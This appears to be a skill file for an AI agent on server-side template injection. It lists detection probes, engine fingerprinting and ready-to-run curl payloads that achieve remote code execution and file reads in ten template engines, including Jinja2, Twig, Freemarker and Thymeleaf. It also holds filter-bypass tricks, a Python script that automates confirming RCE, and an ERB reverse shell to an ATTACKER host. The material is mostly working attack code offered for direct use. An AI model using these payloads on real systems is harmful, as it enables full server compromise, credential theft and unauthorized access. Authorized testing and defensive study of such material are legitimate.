---
name: ssti
description: Server-side template injection testing covering detection, identification of template engines, and engine-specific sandbox escape payloads for Jinja2, Twig, Freemarker, Handlebars, ERB, Pebble, Smarty, Mako, Velocity, and Thymeleaf
---

# Server-Side Template Injection (SSTI) — Expert-Level Testing

SSTI occurs when user input is embedded directly into a server-side template string before rendering, allowing attackers to inject template directives that execute arbitrary code on the server. Unlike XSS (client-side), SSTI runs on the SERVER and typically leads directly to RCE.

## Step 1: Detect Template Injection

Send mathematical expressions in EVERY parameter. Different engines use different delimiters:

```bash
# Universal detection probes — test ALL of these on every parameter
# If any returns a computed result (e.g., 49 instead of the literal text), SSTI exists

# Jinja2 / Twig / Django
curl -sk "https://TARGET/page?name={{7*7}}"           # → 49
curl -sk "https://TARGET/page?name={{7*'7'}}"         # Jinja2 → 7777777, Twig → 49

# Freemarker
curl -sk "https://TARGET/page?name=${7*7}"            # → 49
curl -sk "https://TARGET/page?name=<#assign x=7*7>${x}" # → 49

# ERB (Ruby)
curl -sk "https://TARGET/page?name=<%25= 7*7 %25>"    # → 49

# Smarty (PHP)
curl -sk "https://TARGET/page?name={7*7}"             # → 49

# Pebble (Java)
curl -sk "https://TARGET/page?name={{7*7}}"           # → 49

# Velocity (Java)  
curl -sk "https://TARGET/page?name=#set($x=7*7)${x}" # → 49

# Mako (Python)
curl -sk "https://TARGET/page?name=${7*7}"            # → 49

# Thymeleaf (Java Spring) — expression in URL path or parameters
curl -sk "https://TARGET/page?name=__${7*7}__"        # → 49

# Handlebars (Node.js) — limited execution, test with helpers
curl -sk "https://TARGET/page?name={{#with 7}}{{this}}{{/with}}"
```

### Discrimination: Which Engine?

```bash
# Step 1: Try {{7*'7'}}
# - Returns "7777777" → Jinja2
# - Returns "49" → Twig
# - Returns "{{7*'7'}}" literal → not Jinja2/Twig

# Step 2: Try ${7*7}
# - Returns "49" → Freemarker, Mako, or Thymeleaf
# - Error mentioning "freemarker" → Freemarker
# - Error mentioning "mako" → Mako

# Step 3: Try <%= 7*7 %>
# - Returns "49" → ERB (Ruby)

# Step 4: Try {7*7}
# - Returns "49" → Smarty

# Step 5: Check error messages for engine identification
curl -sk "https://TARGET/page?name={{invalid_syntax_here}}" 2>&1 | grep -iE "jinja|twig|freemarker|thymeleaf|velocity|mako|smarty|pebble|handlebars|erb|django"
```

## Step 2: Jinja2 (Python/Flask) — Sandbox Escape to RCE

Jinja2 is sandboxed — no direct `import os` or `system()`. You must traverse Python's object hierarchy to find dangerous classes.

### Quick RCE Payloads

```bash
# Method 1: via MRO chain → subprocess.Popen
curl -sk "https://TARGET/page?name={{''.__class__.__mro__[1].__subclasses__()}}" 
# This dumps ALL available classes — search for Popen, os._wrap_close, etc.

# Method 2: Direct Popen (if available — class index varies by Python version)
# Find the index of subprocess.Popen in the subclasses list:
curl -sk "https://TARGET/page?name={{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}"

# Method 3: os._wrap_close → popen (most reliable)
curl -sk "https://TARGET/page?name={{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['popen']('id').read() }}"

# Method 4: config object (Flask-specific)
curl -sk "https://TARGET/page?name={{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"

# Method 5: request object (Flask-specific)
curl -sk "https://TARGET/page?name={{ request.__class__.__mro__[1].__subclasses__() }}"
curl -sk "https://TARGET/page?name={{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read() }}"

# Method 6: lipsum (Flask built-in)
curl -sk "https://TARGET/page?name={{ lipsum.__globals__['os'].popen('id').read() }}"

# Method 7: cycler (Flask built-in)  
curl -sk "https://TARGET/page?name={{ cycler.__init__.__globals__.os.popen('id').read() }}"

# Method 8: joiner (Flask built-in)
curl -sk "https://TARGET/page?name={{ joiner.__init__.__globals__.os.popen('id').read() }}"
```

### Finding the Right Subclass Index (Automated)

```python
#!/usr/bin/env python3
"""Find exploitable class index for Jinja2 SSTI."""
import requests, re, urllib3
urllib3.disable_warnings()

TARGET = "https://TARGET/page"
PARAM = "name"

# Step 1: Dump all subclasses
payload = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
r = requests.get(TARGET, params={PARAM: payload}, verify=False, timeout=10)

# Step 2: Find interesting classes
classes = r.text
interesting = ['Popen', 'os._wrap_close', 'catch_warnings', 'FileLoader', 'BuiltinImporter']

for cls in interesting:
    if cls in classes:
        # Find the index
        idx = classes.split("'<class '")
        for i, c in enumerate(idx):
            if cls in c:
                print(f"[+] Found {cls} at index {i-1}")
                
                # Try RCE with this index
                rce_payload = f"{{ ''.__class__.__mro__[1].__subclasses__()[{i-1}].__init__.__globals__['popen']('id').read() }}"
                r2 = requests.get(TARGET, params={PARAM: rce_payload.replace('{{ ', '{{').replace(' }}', '}}')}, verify=False, timeout=10)
                if 'uid=' in r2.text:
                    print(f"[VULN] RCE confirmed! Output: {r2.text[:200]}")
                break
```

### Jinja2 Filter Bypass

```bash
# If underscores (_ ) are blocked:
curl -sk "https://TARGET/?name={{ ''|attr('\\x5f\\x5fclass\\x5f\\x5f') }}"
curl -sk "https://TARGET/?name={{ ''|attr(request.args.a) }}&a=__class__"

# If dots are blocked:
curl -sk "https://TARGET/?name={{ ''['__class__']['__mro__'][1] }}"

# If brackets are blocked:
curl -sk "https://TARGET/?name={{ ''|attr('__class__')|attr('__mro__')|first }}"

# If both _ and . are blocked:
curl -sk "https://TARGET/?name={{ request|attr('application')|attr('\\x5f\\x5fself\\x5f\\x5f') }}"

# If {{ }} are blocked, try {% %} statement injection:
curl -sk "https://TARGET/?name={%25 import os %25}{{ os.popen('id').read() }}"

# Hex encoding bypass:
curl -sk "https://TARGET/?name={{ ''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']() }}"
```

## Step 3: Twig (PHP/Symfony) — RCE

```bash
# Twig 1.x (< 1.20) — direct code execution
curl -sk "https://TARGET/?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Twig 1.x alternative
curl -sk "https://TARGET/?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"

# Twig 2.x / 3.x — _self.env no longer works, use filter/function injection
curl -sk "https://TARGET/?name={{['id']|filter('system')}}"
curl -sk "https://TARGET/?name={{['id']|map('system')}}"
curl -sk "https://TARGET/?name={{['id']|sort('system')}}"
curl -sk "https://TARGET/?name={{['id']|reduce('system')}}"

# File read
curl -sk "https://TARGET/?name={{'/etc/passwd'|file_excerpt(0,100)}}"

# Using source function
curl -sk "https://TARGET/?name={{ source('/etc/passwd') }}"
```

## Step 4: Freemarker (Java) — RCE

```bash
# Execute class — most reliable
curl -sk "https://TARGET/?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"

# ObjectConstructor
curl -sk "https://TARGET/?name=<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>\${ob(\"java.lang.Runtime\").getRuntime().exec(\"id\")}"

# JythonRuntime (if Jython is available)
curl -sk "https://TARGET/?name=<#assign jr=\"freemarker.template.utility.JythonRuntime\"?new()><@jr>import os;os.system('id')</@jr>"

# Read file
curl -sk "https://TARGET/?name=<#assign is=object?api.class.getResourceAsStream('/etc/passwd')>\${is}"

# New API (Freemarker 2.3.17+)  
curl -sk "https://TARGET/?name=\${\"\".class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}"

# Using assign with api
curl -sk "https://TARGET/?name=<#assign classloader=object?api.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>\${dwf.newInstance(ec,null)(\"id\")}"
```

## Step 5: ERB (Ruby on Rails) — RCE

```bash
# Direct code execution — ERB has NO sandbox
curl -sk "https://TARGET/?name=<%25= system('id') %25>"
curl -sk "https://TARGET/?name=<%25= \`id\` %25>"
curl -sk "https://TARGET/?name=<%25= IO.popen('id').read %25>"
curl -sk "https://TARGET/?name=<%25= %x(id) %25>"

# File read
curl -sk "https://TARGET/?name=<%25= File.read('/etc/passwd') %25>"

# Reverse shell
curl -sk "https://TARGET/?name=<%25= system('bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"') %25>"
```

## Step 6: Pebble (Java Spring) — RCE

```bash
# Variable assignment + Runtime exec
curl -sk "https://TARGET/?name={{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}"

# Using beans (Spring-specific)
curl -sk "https://TARGET/?name={{ beans.get('org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController').toString() }}"

# String concatenation for filter bypass
curl -sk "https://TARGET/?name={{'a]'.getClass().forName('java.la]ng.Ru]ntime').getMeth]od('ex]ec','java.la]ng.String').invoke('a]'.getClass().forName('java.la]ng.Ru]ntime').getMeth]od('getRu]ntime').invoke(null),'id')}}"
```

## Step 7: Smarty (PHP) — RCE

```bash
# Direct PHP function calls
curl -sk "https://TARGET/?name={system('id')}"
curl -sk "https://TARGET/?name={passthru('id')}"

# Using Smarty tags
curl -sk "https://TARGET/?name={Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,\"<?php system('id'); ?>\",self::clearConfig())}"

# If tags are restricted:
curl -sk "https://TARGET/?name={if system('id')}{/if}"
curl -sk "https://TARGET/?name={if phpinfo()}{/if}"

# Smarty 3 security bypass
curl -sk "https://TARGET/?name={literal}<script>alert(1)</script>{/literal}"
```

## Step 8: Mako (Python) — RCE

```bash
# Direct Python code execution — Mako has NO sandbox
curl -sk "https://TARGET/?name=<%25 import os %25>\${os.popen('id').read()}"
curl -sk "https://TARGET/?name=\${__import__('os').popen('id').read()}"

# Using expression
curl -sk "https://TARGET/?name=\${''.join(__import__('os').popen('id').readlines())}"
```

## Step 9: Velocity (Java) — RCE

```bash
# Runtime exec
curl -sk "https://TARGET/?name=#set(\$x='')#set(\$rt=\$x.class.forName('java.lang.Runtime'))#set(\$chr=\$x.class.forName('java.lang.Character'))#set(\$str=\$x.class.forName('java.lang.String'))#set(\$ex=\$rt.getRuntime().exec('id'))\$ex"

# Simplified
curl -sk "https://TARGET/?name=#set(\$cmd='id')#set(\$rt=\$x.class.forName('java.lang.Runtime'))#set(\$process=\$rt.getRuntime().exec(\$cmd))"

# ClassTool (if available)
curl -sk "https://TARGET/?name=\$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()"
```

## Step 10: Thymeleaf (Java Spring) — RCE

```bash
# Expression in URL path (Spring view name injection)
curl -sk "https://TARGET/__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"

# Preprocessed expressions
curl -sk "https://TARGET/?name=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"

# Via fragment expressions
curl -sk "https://TARGET/?name=~{::__\${T(java.lang.Runtime).getRuntime().exec('id')}__}"

# Spring Expression Language (SpEL) injection through Thymeleaf
curl -sk "https://TARGET/?name=\${T(java.lang.Runtime).getRuntime().exec('id')}"

# Using ProcessBuilder for output capture
curl -sk "https://TARGET/?name=__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}__::.x"
```

## Step 11: Handlebars (Node.js) — Limited RCE

```bash
# Handlebars is logic-less but can achieve RCE via prototype chain access
curl -sk "https://TARGET/?name={{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"

# Simplified (if lookup helper available)
curl -sk "https://TARGET/?name={{#with (lookup this 'constructor')}}{{#with (call this 'return this')}}{{#with (lookup this 'require')}}{{call this 'child_process'}}{{/with}}{{/with}}{{/with}}"
```

## Testing Methodology

1. **Inject math probes in EVERY parameter** — `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `{7*7}` — look for `49` in response
2. **Identify the engine** — use `{{7*'7'}}` discrimination + error message fingerprinting
3. **Check technology stack** — Python → Jinja2/Mako, PHP → Twig/Smarty, Java → Freemarker/Thymeleaf/Pebble/Velocity, Ruby → ERB, Node.js → Handlebars/Pug
4. **Load engine-specific payloads** — use the exact payloads from this skill
5. **Escalate to RCE** — attempt code execution, file read, then reverse shell
6. **If basic payloads are filtered** — apply encoding bypasses (hex, attr(), bracket notation)
7. **Test POST body, headers, cookies** — SSTI can occur in any user input rendered by a template

## Validation

1. Mathematical expression returns computed result (e.g., `{{7*7}}` → `49`)
2. RCE confirmed via command output in response or OOB callback
3. File read confirmed (e.g., `/etc/passwd` contents returned)

## Impact

- **Critical**: RCE — full server compromise via template engine code execution
- **High**: Arbitrary file read — access sensitive config, credentials, source code
- **Medium**: Information disclosure — template engine version, internal paths

## Pro Tips

1. **SSTI ≠ XSS** — SSTI executes on the SERVER, XSS executes in the BROWSER
2. **Jinja2 is the most common** — Flask apps are everywhere, and the MRO chain works on all Python versions
3. **Flask built-ins** (lipsum, cycler, joiner, config, request) provide shortcuts to `os.popen`
4. **Twig 2.x/3.x** — `|filter('system')` is the modern payload (old `_self.env` method patched)
5. **Freemarker Execute class** is the most reliable Java template RCE
6. **ERB has NO sandbox** — direct `system()` calls work immediately
7. **Thymeleaf expressions in URL paths** — `__${...}__::.x` is the key technique for Spring apps
8. **Test BOTH `{{}}` and `${}`** — same app may use multiple template engines
9. **Error messages reveal the engine** — trigger syntax errors intentionally to fingerprint
10. **Blocked characters?** — Use `|attr()` in Jinja2, hex encoding, or `request.args` to bypass filters
